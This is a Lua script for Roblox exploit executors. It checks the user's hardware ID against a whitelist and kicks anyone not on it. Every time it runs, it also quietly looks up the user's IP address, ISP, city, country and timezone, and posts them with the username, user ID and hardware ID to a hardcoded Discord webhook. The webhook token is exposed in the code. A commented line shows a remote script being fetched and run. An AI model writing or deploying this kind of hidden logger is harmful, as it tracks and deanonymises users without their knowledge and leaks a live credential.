local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalytics = game:GetService("RbxAnalyticsService")

local lp = Players.LocalPlayer
local hwid = RbxAnalytics:GetClientId()

local WEBHOOK_URL = "https://discord.com/api/webhooks/1471569290183442523/engyxPsJOc6mQpCcrpYKM5oYV7PS0J15aQEsaCuL96__qJqhbYaFGbkCRiVJqMFCksFD"

local WhiteList = {
    "C017884D-908B-4482-ACDB-2E4A3C1476CF",
    "415F92CD-908A-464C-9123-9CFD3ECE330E",
    "ADC447EF-9C8A-4A4E-966C-220FE03C8F4F",
    "5D2C1A34-B6E1-4A29-A731-1295328B6A22"
}

-- ========== FUNCTIONS ==========

local function get_request_func()
    return syn and syn.request or http_request or request or nil
end

local function is_whitelisted()
    for _, id in ipairs(WhiteList) do
        if id == hwid then
            return true
        end
    end
    return false
end

local function fetch_ip_info()
    local info = {query = "N/A", isp = "N/A", country = "N/A", city = "N/A", timezone = "N/A"}
    local req = get_request_func()
    if not req then return info end

    local ok, resp = pcall(req, {
        Url = "http://ip-api.com/json",
        Method = "GET"
    })

    if ok and resp and resp.Success and resp.Body then
        local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, resp.Body)
        if ok2 and decoded then
            info = decoded
        end
    end
    return info
end

local function send_webhook(is_valid)
    local req = get_request_func()
    if not req then
        warn("[Logger] No request function available")
        return
    end

    local ip_info = fetch_ip_info()
    local place_id = game.PlaceId
    local place_name = "Unknown"

    pcall(function()
        place_name = MarketplaceService:GetProductInfo(place_id).Name
    end)

    local status_text = is_valid and "✅ WHITELISTED" or "❌ NOT WHITELISTED"
    local embed_color = is_valid and 0x00FF00 or 0xFF0000

    local embed = {
        {
            ["title"] = "Script Executed",
            ["description"] = status_text,
            ["color"] = embed_color,
            ["fields"] = {
                {["name"] = "Name",         ["value"] = lp.Name,                       ["inline"] = true},
                {["name"] = "Display Name", ["value"] = lp.DisplayName,                ["inline"] = true},
                {["name"] = "User ID",      ["value"] = tostring(lp.UserId),           ["inline"] = true},
                {["name"] = "HWID",         ["value"] = "```" .. hwid .. "```",         ["inline"] = false},
                {["name"] = "Game",         ["value"] = place_name .. " (" .. tostring(place_id) .. ")", ["inline"] = false},
                {["name"] = "Time",         ["value"] = os.date("%Y-%m-%d %H:%M:%S"),  ["inline"] = false},
                {["name"] = "IP",           ["value"] = "||" .. (ip_info.query or "N/A") .. "||", ["inline"] = false},
                {["name"] = "Provider",     ["value"] = ip_info.isp or "N/A",          ["inline"] = true},
                {["name"] = "Country",      ["value"] = ip_info.country or "N/A",      ["inline"] = true},
                {["name"] = "City",         ["value"] = ip_info.city or "N/A",          ["inline"] = true},
                {["name"] = "Timezone",     ["value"] = ip_info.timezone or "N/A",      ["inline"] = true},
            },
            ["footer"] = {
                ["text"] = "Executor Logger"
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }

    pcall(req, {
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({["embeds"] = embed})
    })
end

-- ========== MAIN ==========

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local whitelisted = is_whitelisted()

send_webhook(whitelisted)

if whitelisted then
    print("[System] Whitelisted — loading script...")
    -- сюда подгружай основной скрипт
    -- loadstring(game:HttpGet("..."))()
else
    print("[System] Not whitelisted — kicked")
    lp:Kick("You are not on the whitelist.")
end
